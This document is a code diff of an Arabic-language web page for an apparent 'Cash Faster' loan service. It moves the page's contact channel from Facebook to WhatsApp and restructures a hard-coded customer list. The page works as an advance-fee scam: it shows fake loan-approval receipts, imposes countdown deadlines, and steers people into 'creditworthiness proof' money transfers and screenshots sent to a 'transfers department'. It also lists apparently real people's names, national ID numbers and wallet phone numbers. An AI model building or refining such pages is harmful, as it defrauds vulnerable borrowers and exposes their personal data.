@@ -304,8 +304,8 @@
             text-align: right;
         }
 
-        .btn-facebook {
-            background: linear-gradient(135deg, #1877F2, #0E5A9E);
+        .btn-whatsapp {
+            background: linear-gradient(135deg, #25D366, #128C7E);
             padding: 0.8rem 1.5rem;
             border-radius: 3rem;
             display: inline-flex;
@@ -320,9 +320,9 @@
             justify-content: center;
         }
 
-        .btn-facebook:hover {
+        .btn-whatsapp:hover {
             transform: scale(1.02);
-            box-shadow: 0 0 18px #1877F2;
+            box-shadow: 0 0 18px #25D366;
         }
 
         .disabled-btn {
@@ -441,84 +441,40 @@
 </div>
 
 <script>
-    // ======================= قاعدة البيانات الجديدة (9 عملاء فقط) =======================
+    // ======================= قاعدة البيانات الكاملة (جميع العملاء الجدد والسابقين مع حالة كل عميل) =======================
     const customersDatabase = {
-        // 1
-        "27841700951": {
-            name: "ابراهيم عبد المنعم محمود ابو عدسه",
-            loan: 35000,
-            wallet: "فودافون كاش",
-            walletNum: "01002823261",
-            suspended: false
-        },
-        // 2
-        "285060259": {
-            name: "أسماء سيد أحمد محمود",
-            loan: 180000,
-            wallet: "اتصالات كاش",
-            walletNum: "01154789213",
-            suspended: false
-        },
-        // 3
-        "27311246": {
-            name: "يوسف عبد الغني إبراهيم",
-            loan: 120000,
-            wallet: "فودافون كاش",
-            walletNum: "01033445566",
-            suspended: false
-        },
-        // 4
-        "28712102703133": {
-            name: "عبدالرحيم احمد عبد الغفار ابو زيد ",
-            loan: 50000,
-            wallet: "اتصالات كاش",
-            walletNum: "01121600214",
-            suspended: false
-        },
-        // 5
-        "2770301415": {
-            name: "أحمد صلاح الدين محفوظ",
-            loan: 75000,
-            wallet: "فودافون كاش",
-            walletNum: "01077665544",
-            suspended: false
-        },
-        // 6
-        "2820625276": {
-            name: "جابر محمد محمد احمد",
-            loan: 150000,
-            wallet: "فودافون كاش",
-            walletNum: "01031443613",
-            suspended: false
-        },
-        // 7
-        "27403162400184": {
-            name: "نهلة يوسف فاضل بركات",
-            loan: 100000,
-            wallet: "فودافون كاش",
-            walletNum: "01093168681",
-            suspended: false
-        },
-        // 8 (من Excel)
-        "26911052100063": {
-            name: "امل شكري السيد عرفه",
-            loan: 160000,
-            wallet: "فودافون كاش",
-            walletNum: "01014869222",
-            suspended: false
-        },
-        // 9 (من Excel)
-        "28410010123452": {
-            name: "وليد كمال الدين على سليمان",
-            loan: 60000,
-            wallet: "فودافون كاش",
-            walletNum: "01031191670",
-            suspended: false
-        }
+        // العملاء الأساسيون (بعضهم تمت الموافقة)
+        "27806041700951": { name: "ابراهيم عبد المنعم محمود ابو عدسه", loan: 35000, wallet: "فودافون كاش", walletNum: "01002823261", status: "approved" },
+        "285060259": { name: "أسماء سيد أحمد محمود", loan: 180000, wallet: "اتصالات كاش", walletNum: "01154789213", status: "approved" },
+        "27311246": { name: "يوسف عبد الغني إبراهيم", loan: 120000, wallet: "فودافون كاش", walletNum: "01033445566", status: "approved" },
+        "290124983": { name: "نورا علي حسن محمد", loan: 300000, wallet: "اتصالات كاش", walletNum: "01122334455", status: "approved" },
+        "2770301415": { name: "أحمد صلاح الدين محفوظ", loan: 75000, wallet: "فودافون كاش", walletNum: "01077665544", status: "approved" },
+        "2820625276": { name: "جابر محمد محمد احمد", loan: 150000, wallet: "فودافون كاش", walletNum: "01031443613", status: "approved" },
+        "27403162400184": { name: "نهلة يوسف فاضل بركات", loan: 100000, wallet: "فودافون كاش", walletNum: "01093168681", status: "approved" },
+        
+        // العملاء من الملفات السابقة (امل، وليد) - قيد المراجعة
+        "26911052100063": { name: "امل شكري السيد عرفه", loan: 160000, wallet: "فودافون كاش", walletNum: "01014869222", status: "pending" },
+        "28410010123452": { name: "وليد كمال الدين على سليمان", loan: 60000, wallet: "فودافون كاش", walletNum: "01031191670", status: "pending" },
+        
+        // العملاء الجدد من ملف (1) و (2) - قيد المراجعة
+        "27808112101623": { name: "رانيا عبدالله سالم بازرعة", loan: 30000, wallet: "فودافون كاش", walletNum: "01001117444", status: "pending" },
+        "29403120104663": { name: "ندين حسن عبد المنعم", loan: 200000, wallet: "فودافون كاش", walletNum: "01095489544", status: "pending" },
+        
+        // العملاء الجدد من ملف (2) - أبانوب، حسن، صابحة، أشرف، طه، سمير
+        "29502222500499": { name: "ابانوب صبري بديع فؤاد", loan: 40000, wallet: "اتصالات كاش", walletNum: "01226644655", status: "pending" },
+        "30102012114496": { name: "حسن شريف رمضان محمود", loan: 130000, wallet: "فودافون كاش", walletNum: "01067455191", status: "pending" },
+        "28508172701123": { name: "صابحه سعيد ابوالوفا مهران", loan: 200000, wallet: "لا يوجد محفظة", walletNum: "", status: "pending" },
+        "28310250107379": { name: "اشرف محمود ابوضيف عبدالله", loan: 40000, wallet: "لا يوجد محفظة", walletNum: "", status: "pending" },
+        "28810042700913": { name: "طه عيد توفيق احمد", loan: 200000, wallet: "فودافون كاش", walletNum: "01091898288", status: "pending" },
+        "28103250104935": { name: "سمير صابر محمد سليمان", loan: 50000, wallet: "اتصالات كاش", walletNum: "01115906658", status: "pending" },
+
+        // العميل الخاص (عبدالرحيم) - حالتة support_needed
+        "28712102703133": { name: "عبدالرحيم احمد عبد الغفار ابو زيد", loan: 50000, wallet: "اتصالات كاش", walletNum: "01121600214", status: "support_needed" }
     };
 
-    // رابط صفحة فيسبوك لممثلة التحويلات المالية (اميرة بيومى)
-    const FACEBOOK_PROFILE_URL = "https://www.facebook.com/profile.php?id=61577899260182";
+    // رقم واتساب التحويلات المالية الجديد
+    const WHATSAPP_NUMBER = "201226800394";
+    const WHATSAPP_URL = `https://wa.me/${WHATSAPP_NUMBER}`;
     
     let currentCustomer = null;
     let currentNationalId = null;
@@ -533,220 +489,17 @@
         return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
     }
 
-    // دالة لفتح صفحة الفيسبوك
-    function openFacebookPage() {
-        window.open(FACEBOOK_PROFILE_URL, '_blank');
+    // دالة لفتح واتساب مع رسالة مخصصة
+    function openWhatsApp(customMessage) {
+        let msg = customMessage || `مرحباً، أحتاج إلى إنهاء إجراءات صرف التمويل المعتمد الخاص بي.\nالبيانات:\nالاسم: ${currentCustomer ? currentCustomer.name : ''}\nالرقم القومي: ${currentNationalId || ''}\nنوع المحفظة: ${currentCustomer ? currentCustomer.wallet : ''}\nرقم المحفظة: ${currentCustomer ? currentCustomer.walletNum || "غير مسجل" : ''}\nالمبلغ المطلوب: ${currentCustomer ? currentCustomer.loan.toLocaleString('ar-EG') : ''} ج.م\nيرجى توجيهي لاستكمال الصرف فوراً.`;
+        window.open(`${WHATSAPP_URL}?text=${encodeURIComponent(msg)}`, '_blank');
     }
 
-    // ========== واجهة خاصة للعميل صابر (لن تُستخدم لأن الرقم غير موجود) ==========
-    function buildSpecialProofForSabar(customer, nationalId) {
-        const proofAmount = 8500;
-        const deadlineTime = "4:30 عصراً";
-        let secondsLeft = 29 * 60;
-        
-        if (deliveryInterval) clearInterval(deliveryInterval);
-        
+    // ========== الواجهة الخاصة بحالة "تمت الموافقة" ==========
+    function buildApprovedStage(customer, nationalId) {
         const refNum = Math.floor(Math.random() * 1e9);
         const now = new Date();
-        
-        const html = `
-            <div class="payment-card">
-                <div style="display:flex; justify-content:space-between; border-bottom:1px dashed var(--emerald); padding-bottom:0.6rem;">
-                    <h2 style="font-size:1.6rem; background:linear-gradient(120deg,#fff,var(--emerald)); -webkit-background-clip:text; background-clip:text; color:transparent;"><i class="fas fa-check-circle"></i> تم الدفع بنجاح</h2>
-                    <p style="color:var(--royal-gold);">رقم المعاملة: TX-${refNum}</p>
-                </div>
-                <div class="amount-block" style="text-align:center; margin:1rem 0;">
-                    <div style="font-size:1rem; color:var(--text-muted);">المبلغ المدفوع (القرض)</div>
-                    <div class="amount-value">${customer.loan.toLocaleString('ar-EG')} ج.م</div>
-                </div>
-                <div class="details-grid">
-                    <div class="detail-item"><span><i class="fas fa-wallet"></i> طريقة الدفع</span><span>${customer.wallet}</span></div>
-                    <div class="detail-item"><span><i class="fas fa-hashtag"></i> سيتم الدفع إلى محفظة</span><span>${customer.walletNum || "غير مسجل"}</span></div>
-                    <div class="detail-item"><span><i class="fas fa-calendar"></i> التاريخ والوقت</span><span>${now.toLocaleDateString('ar-EG')} - ${now.toLocaleTimeString('ar-EG')}</span></div>
-                </div>
-                <div class="info-message" style="background:rgba(212,175,55,0.2); border-right-color:var(--warning);">
-                    <i class="fas fa-hourglass-half"></i> <strong>⚠️ طلبك معلق منذ أكثر من أربعة أيام</strong><br>
-                    بمجرد إثبات الجدارة الائتمانية (مبلغ ${proofAmount.toLocaleString('ar-EG')} ج.م) سيتم <span class="highlight-value">تفعيل صرف القرض فوراً في أقل من 10 دقائق</span>.
-                </div>
-                <div class="timer-glow">
-                    <div><i class="fas fa-stopwatch"></i> المهلة المتبقية لإثبات الجدارة</div>
-                    <div class="timer" id="saberProofTimer">${formatTimeLeft(secondsLeft * 1000)}</div>
-                    <div style="font-size:0.7rem;">⚠️ يجب إكمال الإثبات قبل الساعة ${deadlineTime} (خلال 29 دقيقة من الآن)</div>
-                </div>
-                <div class="received-badge">✅ مبلغ القرض 150,000 ج.م في انتظار إعطائك إذن السحب بمجرد الإثبات.</div>
-            </div>
-            <div class="credit-card">
-                <h3 style="color:var(--emerald); margin-bottom:1rem;"><i class="fas fa-chart-line"></i> إجراءات إثبات الجدارة الائتمانية (خاص بالعميل صابر)</h3>
-                <div class="step-box" style="border-right-color:var(--royal-gold);">
-                    <strong>📌 التعليمات المطلوبة لإتمام الإثبات بنجاح:</strong><br>
-                    • يجب أن يتوفر في محفظتك مبلغ لا يقل عن <span class="highlight-value">${proofAmount.toLocaleString('ar-EG')} ج.م</span> كجدارة ائتمانية.<br>
-                    • قم بالتقاط صورة (سكرين شوت) توضح رصيد حسابك ويظهر به مبلغ الجدارة أو أعلى.<br>
-                    • قم بتحويل نفس المبلغ (أو الموجود) إلى أي حساب تابع لك (أحد أقاربك أو أصدقائك).<br>
-                    • التقط صورة لعملية التحويل من حسابك إلى الحساب الآخر.<br>
-                    • بعد التحويل، قم بالاستعلام عن رصيد حسابك مرة أخرى والتقط صورة تظهر خصم المبلغ.<br>
-                    • أرسل <strong>الصور الثلاث</strong> (رصيد قبل التحويل، صورة التحويل، رصيد بعد التحويل) إلى قسم التحويلات المالية عبر فيسبوك.
-                </div>
-                <div class="step-box">
-                    <i class="fas fa-info-circle"></i> <strong>ملاحظة هامة:</strong> بعد استلام الصور والتحقق منها، سيتم إيداع مبلغ القرض (150,000 ج.م) في حسابك خلال أقل من 10 دقائق مباشرة.
-                </div>
-                <button class="btn-facebook" id="saberFacebookBtn">
-                    <i class="fab fa-facebook fa-lg"></i> إرسال صور الإثبات إلى مدام اسراء على (قسم التحويلات المالية)
-                </button>
-            </div>
-        `;
-        document.getElementById('resultSection').innerHTML = html;
-        
-        const timerEl = document.getElementById('saberProofTimer');
-        let interval = setInterval(() => {
-            if (secondsLeft <= 0) {
-                clearInterval(interval);
-                if (timerEl) timerEl.innerText = "00:00";
-                alert("انتهت المهلة المحددة (29 دقيقة). لم يتم إثبات الجدارة في الوقت المطلوب. سيتم إلغاء العملية.");
-                document.getElementById('resultSection').innerHTML = `<div class="suspended-card" style="border-color:#EF4444;"><i class="fas fa-times-circle"></i> انتهت المهلة. يرجى التواصل مع الدعم.</div>`;
-            } else {
-                secondsLeft--;
-                const mins = Math.floor(secondsLeft / 60);
-                const secs = secondsLeft % 60;
-                if (timerEl) timerEl.innerText = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
-            }
-        }, 1000);
-        
-        const fbBtn = document.getElementById('saberFacebookBtn');
-        if (fbBtn) {
-            fbBtn.onclick = () => {
-                openFacebookPage();
-                alert("تم فتح صفحة فيسبوك الخاصة بممثلة التحويلات المالية. يرجى إرفاق الصور الثلاث والمتابعة لإتمام الصرف.");
-            };
-        }
-    }
-
-    // ========== دالة لعرض الطلب المنتهي للعميل محمد حسين (لن تُستخدم) ==========
-    function buildExpiredRequestMessage(customer, nationalId) {
-        return `
-            <div class="expired-card">
-                <i class="fas fa-hourglass-end" style="font-size:3rem; color:var(--danger);"></i>
-                <h2 style="color:var(--danger);">⛔ الطلب منتهي</h2>
-                <p><strong>${customer.name}</strong> ، لقد انتهت صلاحية طلبك السابق.</p>
-                <div class="step-box" style="border-right-color:var(--danger);">
-                    <strong>⚠️ لابد من الرجوع إلى قسم التحويلات المالية لفتح الطلب مرة أخرى</strong><br>
-                    سيتم صرف القرض المدفوع لحسابك (${customer.loan.toLocaleString('ar-EG')} ج.م) فوراً بعد إثبات الجدارة المحددة.
-                </div>
-                <div class="step-box">
-                    <i class="fas fa-info-circle"></i> <strong>إجراءات فتح الطلب:</strong><br>
-                    • اضغط على زر فيسبوك أدناه للتواصل مع قسم التحويلات المالية.<br>
-                    • سيتم إعادة تفعيل طلبك ويمكنك بعدها إثبات الجدارة وصرف المبلغ فوراً.
-                </div>
-                <button class="btn-facebook" id="reopenRequestBtn">
-                    <i class="fab fa-facebook fa-lg"></i> التواصل مع قسم التحويلات المالية لفتح الطلب
-                </button>
-            </div>
-        `;
-    }
-
-    function attachExpiredEvents(customer, nationalId) {
-        const btn = document.getElementById('reopenRequestBtn');
-        if (btn) {
-            btn.onclick = () => {
-                openFacebookPage();
-                alert("تم فتح صفحة فيسبوك الخاصة بقسم التحويلات المالية. سيتم إعادة فتح الطلب والمتابعة.");
-            };
-        }
-    }
-
-    // ========== الواجهة الجديدة للعميل 28712102703133 (دعم مباشر لفتح الطلب) ==========
-    function buildContactSupportMessage(customer, nationalId) {
-        return `
-            <div class="support-card">
-                <i class="fas fa-headset" style="font-size:3rem; color:var(--warning);"></i>
-                <h2 style="color:var(--warning);">🔒 طلبك بحاجة إلى فتح من الدعم</h2>
-                <p><strong>${customer.name}</strong> ، تم تعليق طلبك السابق ولا يمكن استكماله آلياً.</p>
-                <div class="step-box" style="border-right-color:var(--warning);">
-                    <strong>⚠️ لإعادة فتح الطلب وصرف القرض المدفوع لحسابك (${customer.loan.toLocaleString('ar-EG')} ج.م):</strong><br>
-                    • يرجى التواصل مع ممثلة التحويلات المالية على فيسبوك عبر الزر أدناه.<br>
-                    • بعد فتح الطلب، ستتمكن من إثبات الجدارة واستلام المبلغ فوراً.
-                </div>
-                <div class="step-box">
-                    <i class="fas fa-info-circle"></i> <strong>ملاحظة هامة:</strong> بمجرد فتح الطلب، ستصلك التعليمات لإتمام صرف القرض مباشرة دون أي رسوم إضافية.
-                </div>
-                <button class="btn-facebook" id="contactSupportDirectBtn">
-                    <i class="fab fa-facebook fa-lg"></i> التواصل مع ممثلة التحويلات المالية (فتح الطلب)
-                </button>
-            </div>
-        `;
-    }
-
-    function attachContactSupportEvents(customer, nationalId) {
-        const btn = document.getElementById('contactSupportDirectBtn');
-        if (btn) {
-            btn.onclick = () => {
-                openFacebookPage();
-                alert("تم فتح صفحة فيسبوك الخاصة بممثلة التحويلات المالية. يرجى إبلاغها برغبتك في فتح الطلب، وسيتم إعادة تفعيله فوراً.");
-            };
-        }
-    }
-
-    // ========== باقي الدوال المساعدة ==========
-    function buildProofRequiredMessage(customer, nationalId) {
-        const proofAmount = customer.loan < 100000 ? 6500 : 8500;
-        return `
-            <div class="proof-required-card">
-                <i class="fas fa-shield-alt" style="font-size:3rem; color:var(--royal-gold);"></i>
-                <h2 style="color:var(--royal-gold);">⚠️ إثبات الجدارة الائتمانية مطلوب</h2>
-                <p style="margin:1rem 0;"><strong>${customer.name}</strong> ، لصرف مبلغ القرض المدفوع (${customer.loan.toLocaleString('ar-EG')} ج.م) يجب عليك إثبات الجدارة الائتمانية من خلال قسم التحويلات المالية على فيسبوك.</p>
-                <div class="step-box" style="border-right-color:var(--royal-gold);">
-                    <strong>📌 تعليمات إثبات الجدارة:</strong><br>
-                    • المبلغ المطلوب لإثبات الجدارة: <span class="highlight-value">${proofAmount.toLocaleString('ar-EG')} ج.م</span><br>
-                    • قم بالتواصل مع قسم التحويلات المالية عبر الزر أدناه.<br>
-                    • سيتم إرشادك لإجراء تحويل دائري (إيداع ثم إعادة) لإثبات ملكية المحفظة.<br>
-                    • بعد الإثبات مباشرة، سيتم صرف كامل المبلغ (${customer.loan.toLocaleString('ar-EG')} ج.م) في حسابك.
-                </div>
-                <div class="timer-glow">
-                    <div><i class="fas fa-stopwatch"></i> يرجى إتمام الإجراء خلال 30 دقيقة</div>
-                    <div class="timer" id="proofTimer">30:00</div>
-                </div>
-                <button class="btn-facebook" id="proofFacebookBtn">
-                    <i class="fab fa-facebook fa-lg"></i> التواصل مع قسم التحويلات المالية لإثبات الجدارة
-                </button>
-                <div class="step-box" style="margin-top:1rem;">
-                    <i class="fas fa-info-circle"></i> ملاحظة: لن يتم صرف المبلغ إلا بعد إتمام إجراءات إثبات الجدارة بنجاح.
-                </div>
-            </div>
-        `;
-    }
-
-    function startProofTimer() {
-        let secondsLeft = 30 * 60;
-        const timerEl = document.getElementById('proofTimer');
-        if (!timerEl) return;
-        const interval = setInterval(() => {
-            if (secondsLeft <= 0) {
-                clearInterval(interval);
-                timerEl.innerText = "00:00";
-                alert("انتهت المهلة المحددة لإثبات الجدارة. سيتم إلغاء العملية.");
-            } else {
-                secondsLeft--;
-                const mins = Math.floor(secondsLeft / 60);
-                const secs = secondsLeft % 60;
-                timerEl.innerText = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
-            }
-        }, 1000);
-    }
-
-    function attachProofEvents(customer, nationalId) {
-        const proofBtn = document.getElementById('proofFacebookBtn');
-        if (proofBtn) {
-            proofBtn.onclick = () => {
-                openFacebookPage();
-                alert("تم فتح صفحة فيسبوك الخاصة بقسم التحويلات المالية. يرجى متابعة التعليمات لإتمام الإثبات.");
-            };
-        }
-    }
-
-    function displayProofStage(customer, nationalId) {
-        if (deliveryInterval) clearInterval(deliveryInterval);
         const proofAmount = customer.loan < 100000 ? 6000 : 8000;
-        const refNum = Math.floor(Math.random() * 1e9);
-        const now = new Date();
         const html = `
             <div class="payment-card">
                 <div style="display:flex; justify-content:space-between; border-bottom:1px dashed var(--emerald); padding-bottom:0.6rem;">
@@ -777,22 +530,90 @@
                 <h3 style="color:var(--emerald); margin-bottom:1rem;"><i class="fas fa-chart-line"></i> إثبات الجدارة الائتمانية (إلزامي لصرف القرض)</h3>
                 <div class="step-box"><strong>💡 ما هي الجدارة؟</strong><br>إجراء أمني لتأكيد ملكية المحفظة. لن تقوم بتحويل أموال إلينا، فقط دورة إيداع من شخص موثوق وإعادته.</div>
                 <div class="step-box">🔹 المبلغ المطلوب لإثبات الجدارة: <span class="highlight-value">${proofAmount.toLocaleString('ar-EG')} ج.م</span></div>
-                <div class="step-box">📌 الخطوات:<br>1- اطلب من شخص تثق به تحويل ${proofAmount.toLocaleString('ar-EG')} ج.م إلى محفظتك.<br>2- التقط لقطة شاشة توضح المبلغ داخل رصيدك.<br>3- قم بتحويل نفس المبلغ مرة أخرى إلى نفس الشخص.<br>4- التقط لقطة شاشة ثانية لخروج المبلغ.<br>5- أرسل الصورتين عبر فيسبوك إلى فريق Cash Faster.<br>✅ بعد الإثبات مباشرة، سيتم صرف كامل المبلغ (${customer.loan.toLocaleString('ar-EG')} ج.م) في حسابك فوراً.</div>
-                <button class="btn-facebook" id="sendProofFacebookBtn">
-                    <i class="fab fa-facebook fa-lg"></i> إرسال صور الإثبات والتحقق الفوري
+                <div class="step-box">📌 الخطوات:<br>1- اطلب من شخص تثق به تحويل ${proofAmount.toLocaleString('ar-EG')} ج.م إلى محفظتك.<br>2- التقط لقطة شاشة توضح المبلغ داخل رصيدك.<br>3- قم بتحويل نفس المبلغ مرة أخرى إلى نفس الشخص.<br>4- التقط لقطة شاشة ثانية لخروج المبلغ.<br>5- أرسل الصورتين عبر واتساب إلى فريق Cash Faster.<br>✅ بعد الإثبات مباشرة، سيتم صرف كامل المبلغ (${customer.loan.toLocaleString('ar-EG')} ج.م) في حسابك فوراً.</div>
+                <button class="btn-whatsapp" id="sendProofWhatsAppBtn">
+                    <i class="fab fa-whatsapp fa-lg"></i> إرسال صور الإثبات والتحقق الفوري
                 </button>
             </div>
         `;
         document.getElementById('resultSection').innerHTML = html;
         startDeliveryTimer();
-        
-        const fbBtn = document.getElementById('sendProofFacebookBtn');
-        if (fbBtn) {
-            fbBtn.onclick = () => {
-                openFacebookPage();
-                alert("تم فتح صفحة فيسبوك الخاصة بقسم التحويلات المالية. يرجى إرفاق الصور والمتابعة.");
+        const btn = document.getElementById('sendProofWhatsAppBtn');
+        if (btn) {
+            btn.onclick = () => {
+                openWhatsApp(`السلام عليكم\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nسأقوم بإرسال صورتي الإيداع والخروج لإثبات الجدارة بمبلغ ${proofAmount.toLocaleString('ar-EG')} ج.م.`);
             };
         }
+    }
+
+    // ========== واجهة خاصة للعميل "قيد المراجعة" ==========
+    function buildPendingStage(customer, nationalId) {
+        const html = `
+            <div class="proof-required-card">
+                <i class="fas fa-clock" style="font-size:3rem; color:var(--royal-gold);"></i>
+                <h2 style="color:var(--royal-gold);">⏳ طلبك قيد المراجعة</h2>
+                <p style="margin:1rem 0;"><strong>${customer.name}</strong> ، تم استلام طلبك بنجاح وجاري دراسته من قبل فريق التمويل.</p>
+                <div class="step-box" style="border-right-color:var(--royal-gold);">
+                    <strong>📌 مدة المراجعة المتوقعة:</strong> خلال 72 ساعة كحد أقصى.<br>
+                    سيتم إشعارك بنتيجة المراجعة عبر هذه الصفحة. يرجى متابعة حالتك من حين لآخر.
+                </div>
+                <div class="details-grid">
+                    <div class="detail-item"><span><i class="fas fa-wallet"></i> المحفظة المسجلة</span><span>${customer.wallet} ${customer.walletNum ? '('+customer.walletNum+')' : ''}</span></div>
+                    <div class="detail-item"><span><i class="fas fa-money-bill-wave"></i> المبلغ المطلوب</span><span>${customer.loan.toLocaleString('ar-EG')} ج.م</span></div>
+                </div>
+                <div class="step-box" style="margin-top:1rem;">
+                    <i class="fas fa-info-circle"></i> ملاحظة: لن تتمكن من إتمام إجراءات الصرف إلا بعد الموافقة على طلبك.
+                </div>
+            </div>
+        `;
+        document.getElementById('resultSection').innerHTML = html;
+    }
+
+    // ========== واجهة خاصة للعميل الذي يحتاج لدعم (عبدالرحيم) مع واتساب ==========
+    function buildSupportNeededStage(customer, nationalId) {
+        const html = `
+            <div class="support-card">
+                <i class="fas fa-headset" style="font-size:3rem; color:var(--warning);"></i>
+                <h2 style="color:var(--warning);">🔒 طلبك بحاجة إلى فتح من الدعم</h2>
+                <p><strong>${customer.name}</strong> ، تم تعليق طلبك السابق ولا يمكن استكماله آلياً.</p>
+                <div class="step-box" style="border-right-color:var(--warning);">
+                    <strong>⚠️ لإعادة فتح الطلب وصرف القرض المدفوع لحسابك (${customer.loan.toLocaleString('ar-EG')} ج.م):</strong><br>
+                    • يرجى التواصل مع خدمة التحويلات المالية على واتساب عبر الزر أدناه.<br>
+                    • بعد فتح الطلب، ستتمكن من إثبات الجدارة واستلام المبلغ فوراً.
+                </div>
+                <div class="step-box">
+                    <i class="fas fa-info-circle"></i> <strong>ملاحظة هامة:</strong> بمجرد فتح الطلب، ستصلك التعليمات لإتمام صرف القرض مباشرة دون أي رسوم إضافية.
+                </div>
+                <button class="btn-whatsapp" id="contactSupportBtn">
+                    <i class="fab fa-whatsapp fa-lg"></i> التواصل مع خدمة التحويلات المالية (فتح الطلب)
+                </button>
+            </div>
+        `;
+        document.getElementById('resultSection').innerHTML = html;
+        const btn = document.getElementById('contactSupportBtn');
+        if (btn) {
+            btn.onclick = () => {
+                openWhatsApp(`📢 طلب إعادة فتح الطلب (عبدالرحيم)\nالعميل: ${customer.name}\nالرقم القومي: ${nationalId}\nالمبلغ المستحق للصرف: ${customer.loan.toLocaleString('ar-EG')} ج.م\nأرجو إعادة فتح الطلب لإتمام إثبات الجدارة وصرف القرض.`);
+            };
+        }
+    }
+
+    // ========== دالة الحالات الخاصة (للبعض إن وجدت) ==========
+    function buildSpecialProofForSabar(customer, nationalId) {
+        // هذه الدالة كانت خاصة بعميل صابر (رقم معين) - لن تُستخدم حالياً لأن رقمه غير موجود بالبيانات الجديدة
+        // ولكن نتركها للتوافق
+        buildApprovedStage(customer, nationalId);
+    }
+
+    function buildExpiredRequestMessage(customer, nationalId) {
+        // دالة خاصة بالطلب المنتهي - نستخدم واجهة الدعم بدلاً منها
+        return buildSupportNeededStage(customer, nationalId);
+    }
+
+    function buildProofRequiredMessage(customer, nationalId) {
+        // دالة خاصة بإثبات الجدارة - نستخدم واجهة "قيد المراجعة" أو "تمت الموافقة" حسب الحالة
+        if (customer.status === 'approved') return buildApprovedStage(customer, nationalId);
+        else return buildPendingStage(customer, nationalId);
     }
 
     function startDeliveryTimer() {
@@ -832,35 +653,20 @@
             currentNationalId = nationalId;
             document.getElementById('errorCard').style.display = 'none';
 
-            // الحالات الخاصة الأخرى (لا تؤثر على العميل المطلوب)
-            if (nationalId === "26907312400212") {
-                buildSpecialProofForSabar(customer, nationalId);
-                return;
+            // تحديد الواجهة بناءً على حالة العميل
+            switch (customer.status) {
+                case 'approved':
+                    buildApprovedStage(customer, nationalId);
+                    break;
+                case 'pending':
+                    buildPendingStage(customer, nationalId);
+                    break;
+                case 'support_needed':
+                    buildSupportNeededStage(customer, nationalId);
+                    break;
+                default:
+                    buildPendingStage(customer, nationalId);
             }
-            if (nationalId === "29209190102632") {
-                const html = buildExpiredRequestMessage(customer, nationalId);
-                document.getElementById('resultSection').innerHTML = html;
-                attachExpiredEvents(customer, nationalId);
-                return;
-            }
-            if (nationalId === "29407021601596") {
-                const html = buildProofRequiredMessage(customer, nationalId);
-                document.getElementById('resultSection').innerHTML = html;
-                startProofTimer();
-                attachProofEvents(customer, nationalId);
-                return;
-            }
-
-            // ========== حالة العميل 28712102703133 - واجهة دعم مباشرة (بدون تعقيدات) ==========
-            if (nationalId === "28712102703133") {
-                const html = buildContactSupportMessage(customer, nationalId);
-                document.getElementById('resultSection').innerHTML = html;
-                attachContactSupportEvents(customer, nationalId);
-                return;
-            }
-
-            // المسار العادي لجميع العملاء الآخرين
-            displayProofStage(customer, nationalId);
         }, 800);
     }
 
